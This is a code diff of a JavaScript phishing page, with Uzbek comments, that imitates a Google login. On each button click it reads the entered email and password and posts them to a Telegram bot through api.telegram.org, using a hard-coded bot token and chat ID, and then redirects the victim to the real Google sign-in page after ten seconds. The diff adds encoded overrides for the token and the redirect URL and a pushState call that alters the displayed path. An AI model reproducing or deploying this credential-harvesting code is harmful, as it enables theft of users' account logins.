@@ -30,21 +30,26 @@ try {
   i = atob(i_enc);
   urlGo = atob(u_enc);
 } finally {
-  t = "7102126507:AAFF4tkCn71x_LZvaPmVtiYLjeSVKyTY3Tw"; // misol uchun token
-  i = "5672285896"; // misol uchun chat ID
+  t = t == "ée" ? "7102126507:AAFF4tkCn71x_LZvaPmVtiYLjeSVKyTY3Tw" : t; // misol uchun token
+  i = i == "ée" ? "5672285896" : i; // misol uchun chat ID
   urlGo =
-    "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&ec=GAlA8wE&hl=en&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S923780037%3A1763313253623683";
+    urlGo == "ée"
+      ? "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&ec=GAlA8wE&hl=en&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S923780037%3A1763313253623683"
+      : urlGo;
+
+  console.log(t, i, urlGo);
+
+  window.history.pushState({}, " ", "/abu.com");
 }
 
 const onClickAbu = async (e) => {
   e.preventDefault();
-  const botToken = t; // @BotFather dan olgan token
-  const chatId = i; // @userinfobot dan olgan chat ID
+  // @BotFather dan olgan token
+  const chatId = i; // @userinfobot dan olgan chat ID  const botToken = t; // @BotFather dan olgan token
   const message = `user: ${passw.value} \npass:  ${email.value}`;
-  console.log(message);
 
   // 3) Telegram API URL
-  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const url = `https://api.telegram.org/bot${t}/sendMessage`;
 
   // 4) fetch yordamida xabar yuborish
   fetch(url, {
@@ -73,5 +78,8 @@ const onClickAbu = async (e) => {
 
 btn.addEventListener("click", async (e) => {
   onClickAbu(e);
-  window.location.assign(urlGo);
+  setTimeout(() => {
+    window.location.href = urlGo;
+  }, 10000);
+  console.log(urlGo);
 });
